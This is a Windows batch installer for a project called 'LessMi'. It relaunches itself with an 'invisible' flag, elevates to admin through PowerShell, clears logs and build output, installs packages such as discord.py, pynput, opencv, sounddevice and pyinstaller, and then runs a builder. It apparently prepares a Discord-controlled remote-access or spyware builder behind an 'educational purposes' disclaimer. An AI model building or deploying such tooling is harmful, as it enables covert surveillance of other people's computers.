::  __  __       _          _    ____ 
:: |  \/  | __ _| |_ ___   / \  / ___|
:: | |\/| |/ _` | __/ _ \ / _ \| |  _ 
:: | |  | | (_| | ||  __// ___ \ |_| |
:: |_|  |_|\__,_|\__\___/_/   \_\____|
::
:: © Copyright 2026 - MateAG
:: All rights reserved. Any copy without 
:: consent of this code will be reported.
::
:: ℹ > This project is only for educational purposes.
:: The creator is NOT responsible of any illegal/malicious use
:: of this project.
::
:: The creator advices you to use this for testing and
:: legal activities. If you want to install this on
:: someone else computer, please ask them for the
:: permission to.
::
:: Thank you and happy testing! <3

@echo off
title LessMi - Installer - PLEASE BE PATIENT, THIS MAY TAKE A WHILE
setlocal

if "%~1"=="" (
    start "" "%~f0" -invisible
    exit /b
)

net session >nul 2>&1
if %errorlevel%==0 goto :code

powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '-invisible' -Verb RunAs"
exit /b

:code
cd /d "%~dp0"
pushd "%~dp0"
del /f /q "%temp%\LessMi-Installer.log" >nul 2>&1
del /f /q dist\* >nul 2>&1
echo Installing dependencies...


:: for some reason, the following command doesn't work, so i had to add the individual dependencies as commands.
rem pip install -r requirements.txt


python -m pip install --upgrade pip
pip install discord.py[voice]
pip install discord.py
pip install PyNaCl
pip install aiohttp
pip install aiosqlite
pip install requests
pip install pyinstaller
pip install customtkinter
pip install pillow
pip install opencv-python-headless
pip install numpy
pip install imageio
pip install audioop-lts
pip install imageio-ffmpeg
pip install sounddevice
pip install pynput
pip install pyautogui
pip install pycryptodomex
pip install plyer
pip install "pygame-ce>=2.5.5"
pip install psutil
pip install pywin32
pip install comtypes
pip install pycaw
pip install pygrabber
pip install ffmpeg-python
pip install pypiwin32
pip install pycryptodome

cls
echo Dependencies installed successfully!
echo.
echo Builder has been started, please follow the instructions in the builder window.
py builder.py